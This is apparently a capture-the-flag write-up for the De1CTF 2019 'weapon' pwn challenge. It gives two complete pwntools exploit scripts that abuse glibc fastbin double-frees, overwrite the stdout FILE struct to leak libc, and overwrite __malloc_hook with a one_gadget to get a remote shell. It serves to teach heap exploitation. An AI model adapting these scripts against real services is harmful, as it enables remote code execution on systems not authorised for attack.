# weapon  
[docker-enviroment](./docker-enviroment)

this problem have two ways to solve it

> the key to topic is to let a chunk have libc address in fd. and then we use
> a trick to leak a libc address ,finally use fastbin attack to get shell.

## first  
make a fake 0x80(more than that is ok) chunk and free it .so that we can get
libc in fd and then edit the struct of stdout to leak.finally get shell.

```  
from pwn import *  
def cmd(c):  
	p.sendlineafter(">> \n",str(c))  
def Cmd(c):  
	p.sendlineafter(">> ",str(c))  
def add(size,idx,name="padding"):  
	cmd(1)  
	p.sendlineafter(": ",str(size))  
	p.sendlineafter(": ",str(idx))  
	p.sendafter(":\n",name)  
def free(idx):  
	cmd(2)  
	p.sendlineafter(":",str(idx))  
def edit(idx,name):  
	cmd(3)  
	p.sendlineafter(": ",str(idx))  
	p.sendafter(":\n",name)  
def Add(size,idx,name="padding"):  
	Cmd(1)  
	p.sendlineafter(": ",str(size))  
	p.sendlineafter(": ",str(idx))  
	p.sendafter(":",name)  
def Free(idx):  
	Cmd(2)  
	p.sendlineafter(":",str(idx))

#p=process('./pwn')  
p=remote("139.180.216.34",8888)  
#context.log_level='debug'  
add(0x18,0)  
add(0x18,1)  
add(0x60,2,p64(0x0)+p64(0x21)+'\x00'*0x18+p64(0x21)*5)  
add(0x60,3,p64(0x21)*12)  
add(0x60,4)  
add(0x60,5)  
free(0)  
free(1)  
free(0)  
free(1)

add(0x18,0,"\x50")  
add(0x18,0,'\x00'*8)  
add(0x18,0,"A")

add(0x18,0,'GET')

edit(2,p64(0x0)+p64(0x91))  
free(0)

add(0x18,0)  
add(0x60,0,'\xdd\x25')

free(2)  
free(5)  
free(2)  
free(5)

#gdb.attach(p,'')  
add(0x60,4,'\x70')  
#  
add(0x60,0)  
add(0x60,0)  
add(0x60,0)  
add(0x60,0,'\x00'*(0x40+3-0x10)+p64(0x1800)+'\x00'*0x19)  
p.read(0x40)

base=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7dd2600-0x7ffff7a0d000)  
log.warning(hex(base))  
#raw_input()  
libc=ELF("./pwn").libc  
Add(0x60,0)  
Add(0x60,1)  
Add(0x18,2)  
Free(0)  
Free(1)  
Free(0)  
Add(0x60,0,p64(libc.sym['__malloc_hook']+base-35))  
Add(0x60,0)  
Add(0x60,0)  
one=0xf02a4  
Add(0x60,0,'\x00'*19+p64(one+base))

Free(1)  
Free(1)

p.interactive()

```

## second  
when we use scanf to input something .if you input lots of things ,it will
malloc a 0x400 chunk to keep it temporarily。if we keep some fastbin when it
malloc.it will be put into smallbin.now we also have libc address.

```  
from pwn import *  
context.log_level = "debug"  
#p = process("./weapon")  
p = remote("139.180.216.34",8888)  
elf = ELF("./weapon")  
a = elf.libc  
#gdb.attach(p)  
def create(idx,size,content):  
	p.recvuntil(">> \n")  
	p.sendline(str(1))  
	p.recvuntil("weapon: ")  
	p.sendline(str(size))  
	p.recvuntil("index: ")  
	p.sendline(str(idx))  
	p.recvuntil("name:")  
	p.send(content)  
def delete(idx):  
	p.recvuntil(">> ")  
	p.sendline(str(2))  
	p.recvuntil("idx :")  
	p.sendline(str(idx))

def edit(idx,content):  
	p.recvuntil(">> ")  
	p.sendline(str(3))  
	p.recvuntil("idx: ")  
	p.sendline(str(idx))  
	p.recvuntil("content:\n")  
	p.send(content)

create(0,0x60,"a")  
create(1,0x60,"b")  
create(2,0x60,"c")  
delete(0)  
delete(1)  
p.recvuntil(">> ")  
p.sendline("1"*0x1000)  
create(3,0x60,"\xdd\x25")  
create(4,0x60,"e")  
delete(2)  
delete(1)  
edit(1,"\x00")  
create(5,0x60,"f")  
create(6,0x60,"f")  
file_struct = p64(0xfbad1887)+p64(0)*3+"\x58"  
create(7,0x60,"\x00"*0x33+file_struct)  
libc_addr =
u64(p.recvuntil("\x00",drop=True)[1:].ljust(8,"\x00"))-a.symbols["_IO_2_1_stdout_"]-131  
print hex(libc_addr)  
delete(6)  
edit(6,p64(libc_addr+a.symbols["__malloc_hook"]-0x23))

create(8,0x60,"t")

create(9,0x60,"a"*0x13+p64(libc_addr+0xf1147))  
p.recvuntil(">> \n")  
p.sendline(str(1))  
p.recvuntil("weapon: ")  
p.sendline(str(0x60))  
p.recvuntil("index: ")  
p.sendline(str(6))

p.interactive()  
```  

Original writeup (https://github.com/De1ta-
team/De1CTF2019/tree/master/writeup/pwn/Weapon).